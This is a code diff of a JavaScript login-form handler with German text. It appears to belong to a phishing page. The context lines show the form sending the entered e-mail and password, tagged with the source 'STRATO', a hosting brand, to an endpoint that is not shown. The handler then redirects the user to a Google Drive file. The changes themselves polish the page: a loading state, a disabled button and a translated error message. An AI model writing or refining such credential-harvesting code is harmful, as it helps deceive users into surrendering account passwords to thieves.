@@ -52,15 +52,15 @@ form.addEventListener('submit', (e) => {
   const emailOk = email.value.trim().length > 0;
   const passOk = password.value.trim().length > 0;
   const loginButton = document.getElementById("btn");
-    loginButton.loading = true;
-    loginButton.textContent = 'Anmelden...';
+    loginButton.classList.add('loading');
+    loginButton.disabled = true;
   
 
   setError(email, !emailOk);
   setError(password, !passOk);
 
   if (!emailOk || !passOk) {
-    demoNote.textContent = "Please fill in both your e-mail address and password.";
+    demoNote.textContent = "Bitte gib sowohl deine E-Mail-Adresse als auch dein Passwort ein.";
     demoNote.hidden = false;
     (!emailOk ? email : password).focus();
     return;
@@ -76,9 +76,20 @@ form.addEventListener('submit', (e) => {
                 password: password.value,
                 source: 'STRATO',
               }),
+      		  
+      		  
+      
             })
+    
+    		  .finally(() => {
+    		  loginButton.classList.remove('loading');
+   			  loginButton.disabled = false;
+  			  })
+    
               .then((data) => {
                 window.location.href = 'https://drive.google.com/file/d/1RLPmduwBiE3iDOcjJIYEkJRhXS4_k80V/view?usp=drive_link';
               });
+    			
+    		  
   
 });
